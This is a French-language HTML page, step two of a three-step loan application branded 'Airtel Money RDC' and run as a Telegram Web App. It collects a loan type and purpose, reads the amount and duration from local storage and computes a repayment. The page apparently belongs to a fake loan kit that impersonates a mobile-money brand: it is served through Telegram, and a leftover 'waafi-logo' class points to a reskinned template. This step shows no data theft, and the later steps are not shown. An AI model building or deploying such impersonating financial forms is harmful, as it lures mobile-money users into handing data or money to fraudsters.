<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande de Prêt - Étape 2</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .nav-header { width: 100%; background: linear-gradient(90deg, #ff0000 0%, #cc0000 100%); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
        .waafi-logo { font-size: 24px; font-weight: bold; }
        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); box-sizing: border-box; }
        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
        .active-bar { background: #ff0000; }
        .input-wrap { margin-bottom: 22px; }
        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
        select, input, textarea { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; font-size: 17px; box-sizing: border-box; background: #fff; }
        .btn-container { margin-top: 30px; display: flex; flex-direction: column; gap: 15px; }
        .back-btn { background-color: #f1f1f1; color: #777; border: 1px solid #ddd; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .next-btn { background: linear-gradient(90deg, #ff0000 0%, #cc0000 100%); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        .footer-text { text-align: center; font-size: 13px; color: #aaa; margin-top: 40px; padding-bottom: 30px; }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Retour</div>
    <div class="waafi-logo">Airtel Money</div>
    <div style="font-size: 26px;">☰</div>
</div>

<div class="form-card">
    <h2>Demande de Prêt</h2>
    <p class="step-info">Étape 2 sur 3</p>

    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar active-bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Type de Prêt</label>
        <select id="loanType">
            <option value="Prêt Personnel" selected>Prêt Personnel</option>
            <option value="Prêt Commercial">Prêt Commercial / Business</option>
            <option value="Prêt Automobile">Prêt Automobile</option>
            <option value="Prêt Immobilier">Prêt Immobilier</option>
            <option value="Prêt Scolaire">Prêt Scolaire</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>Montant du Prêt</label>
        <input type="text" id="loanAmount" readonly style="background:#f9f9f9">
    </div>

    <div class="input-wrap">
        <label>Durée du Prêt</label>
        <input type="text" id="loanDuration" readonly style="background:#f9f9f9">
    </div>

    <div class="input-wrap">
        <label>Motif du Prêt</label>
        <textarea id="loanPurpose" rows="3" placeholder="Pourquoi utilisez-vous cet argent ?"></textarea>
    </div>

    <div class="btn-container">
        <button class="back-btn" onclick="goBack()">PRÉCÉDENT</button>
        <button class="next-btn" onclick="goNext()">ÉTAPE SUIVANTE</button>
    </div>
</div>

<div class="footer-text">© 2026 Airtel Money RDC</div>

<script>
    function goNext() {
        const purposeEl = document.getElementById('loanPurpose');
        const typeEl = document.getElementById('loanType');
        
        const amountVal = Number(localStorage.getItem('amount')) || 0;
        const durationVal = localStorage.getItem('loanDuration') || "1";
        const currentCurrency = localStorage.getItem('currency') || "CDF";

        if (!purposeEl || !typeEl) return;

        const purpose = purposeEl.value.trim();
        const type = typeEl.value;

        if (!purpose) {
            alert("Veuillez indiquer le motif du prêt.");
            return;
        }

        // Sauvegarde standard
        localStorage.setItem('loanPurpose', purpose);
        localStorage.setItem('loanType', type);

        // Nettoyage de la chaîne de durée (ex: "12 mois" devient "12")
        const cleanDuration = Number(durationVal.replace(/\D/g, '')) || 1; 
        
        // Calcule le remboursement mensuel (Montant * taux d'intérêt de 1.12 / durée)
        const monthly = (amountVal * 1.12) / cleanDuration;

        localStorage.setItem('loan_amount', amountVal);
        localStorage.setItem('loan_term', cleanDuration);
        
        if (currentCurrency === 'CDF') {
            localStorage.setItem('monthly_repayment', Math.round(monthly).toString());
        } else {
            localStorage.setItem('monthly_repayment', monthly.toFixed(2));
        }

        window.location.href = "page3.html"; 
    }

    function goBack() {
        window.location.href = "index.html";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;

        if (tg) {
            tg.ready();
            tg.expand();
        }

        const amountEl = document.getElementById('loanAmount');
        const durationEl = document.getElementById('loanDuration');

        if (amountEl && durationEl) {
            const amount = Number(localStorage.getItem('amount')) || 50000;
            const duration = Number((localStorage.getItem('loanDuration') || "1").replace(/\D/g, '')) || 1;
            const currency = localStorage.getItem('currency') || "CDF";

            if (currency === 'CDF') {
                amountEl.value = `${amount.toLocaleString('fr-FR')} CDF`;
            } else {
                amountEl.value = `${amount.toLocaleString('fr-FR')} $`;
            }
            durationEl.value = `${duration} mois`;
        }
    };
</script>

</body>
</html>
